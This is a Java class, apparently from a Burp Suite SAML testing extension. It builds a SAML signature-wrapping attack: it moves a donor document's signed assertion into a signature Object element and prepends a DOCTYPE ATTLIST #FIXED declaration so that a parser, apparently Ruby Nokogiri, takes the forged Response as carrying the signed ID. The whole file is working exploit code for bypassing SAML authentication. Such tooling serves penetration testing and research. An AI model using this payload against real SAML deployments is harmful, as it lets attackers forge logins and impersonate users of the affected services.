package burp.wrappers;

import burp.utilities.exceptions.SAMLException;
import burp.utilities.helpers.XMLHelpers;
import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

import static burp.utilities.helpers.Constants.XMLNS;

public class RubyNokogiriATTLIST {

    public static String apply(Document document, Document src) throws SAMLException {
        try {
            XMLHelpers xmlHelpers = XMLHelpers.getInstance();

            Document newDoc = (Document) document.cloneNode(true);
            Document source = (Document) src.cloneNode(true);

            // Get the Response and Assertion elements.
            Element newResponse = (Element) newDoc.getElementsByTagNameNS("*", "Response").item(0);
            Element newAssertion = (Element) newDoc.getElementsByTagNameNS("*", "Assertion").item(0);

            if (newResponse == null) {
                throw new IllegalArgumentException("No 'Response' element found.");
            }

            if (newAssertion == null) {
                throw new IllegalArgumentException("No 'Assertion' element found.");
            }


            Element signature = null;

            Element sourceRoot = source.getDocumentElement();
            NodeList sourceSignatures = sourceRoot.getElementsByTagNameNS("*", "Signature");
            if (sourceSignatures.getLength() > 0) {
                signature = (Element) sourceSignatures.item(0);
            }

            if (signature == null) {
                throw new IllegalArgumentException("No signature found in donor document.");
            }

            xmlHelpers.removeAllSignatures(newDoc);
            Node importedSignature = newDoc.importNode(signature, true);

            String namePrefix = signature.getPrefix();
            String signatureNamespace = signature.getNamespaceURI();
            if (namePrefix != null && !namePrefix.isEmpty() && signatureNamespace != null) {
                String xmlnsAttrName = "xmlns:" + namePrefix;
                if (!newResponse.hasAttributeNS(XMLNS, namePrefix)) {
                    newResponse.setAttributeNS(
                            XMLNS,
                            xmlnsAttrName,
                            signatureNamespace
                    );
                }
            }

            newResponse.insertBefore(importedSignature, newResponse.getFirstChild().getNextSibling());

            String qualifiedName = (namePrefix != null && !namePrefix.isEmpty())
                    ? namePrefix + ":Object"
                    : "Object";

            Element objectNode = newDoc.createElementNS(signatureNamespace, qualifiedName);

            importedSignature.appendChild(objectNode);
            // Append a deep clone of the Assertion node to the Object node.
            xmlHelpers.removeAllSignatures(source);
            xmlHelpers.removeEmptyTags(source);
            source.normalize();

            Element realAssertion = (Element) newDoc.importNode(sourceRoot, true);
            objectNode.appendChild(realAssertion);

            String originalAssertionID = realAssertion.getAttribute("ID");

            // DOCTYPE declaration trick to avoid usage of Java reflections
            List<String> doctypeEntities = new ArrayList<>();

            String responsePrefix = newResponse.getPrefix();
            String responseQualifiedName = (responsePrefix != null && !responsePrefix.isEmpty())
                    ? responsePrefix + ":Response"
                    : "Response";

            doctypeEntities.add(String.format("<!ATTLIST %s ID CDATA #FIXED \"%s\">\n", responseQualifiedName, originalAssertionID));

            realAssertion.setAttribute("ID", originalAssertionID);

            // Set the Response's ID attribute to a new fixed value.
            newResponse.removeAttribute("ID");

            StringBuilder doctypePayload = new StringBuilder("<!DOCTYPE ");
            doctypePayload.append(responseQualifiedName);
            doctypePayload.append(" [\n");
            for (String entity : doctypeEntities) {
                doctypePayload.append(entity);
            }
            doctypePayload.append("]>");
            doctypeEntities.clear();

            String samlMessage = xmlHelpers.getString(newDoc, 0, true);
            samlMessage = samlMessage.replace("&amp;", "&");

            return doctypePayload + samlMessage;
        } catch (IOException e) {
            throw new SAMLException(e);
        }
    }
}
